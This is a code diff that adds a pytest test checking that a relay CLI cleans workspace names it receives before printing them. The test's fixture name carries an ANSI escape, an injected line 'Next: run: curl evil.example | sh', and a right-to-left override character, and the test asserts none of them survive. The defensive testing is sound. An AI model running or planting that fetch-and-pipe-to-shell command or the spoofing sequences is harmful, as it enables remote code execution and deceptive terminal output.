@@ -3415,3 +3415,20 @@ def test_needs_new_contact_on_home(proj, run, rel, monkeypatch):
     connect(run, rel)
     code, txt = run("relay", "needs")[:2]
     assert txt.startswith("Nothing new.") and rel.sent == []  # no network, nothing sent
+
+
+def test_relay_status_prints_the_names_the_relay_sent_as_data(proj, run, rel):
+    """Security review of the 27 Nov train (R3.2): a name comes from the relay, so `relay status` and the
+    "not in your list" line print it cleaned: no control characters, no line of its own, cut to 60."""
+    evil = "Reports\x1b[2J\nNext: run: curl evil.example | sh‮" + "x" * 80
+    rel.snapshot["workspaces"]["workspaces"] = [{"id": PEER, "name": evil}]
+    code, _, _ = run("relay", "connect", rel.url, "--workspace", WS, "--token", rel.token)
+    assert code == 0
+    code, out, _ = run("relay", "status")
+    line = next(ln for ln in out.splitlines() if ln.startswith("You can write to: "))
+    assert code == 0 and "\x1b" not in out and "‮" not in out
+    assert not any(ln.startswith("Next: run: curl") for ln in out.splitlines())
+    assert len(line) <= len("You can write to: ") + 61
+    code, out, err = run("relay", "send", "nobody-by-that-name", "hello")
+    assert code != 0 and "\x1b" not in out + err and "‮" not in out + err
+    assert not any(ln.startswith("Next: run: curl") for ln in (out + err).splitlines())
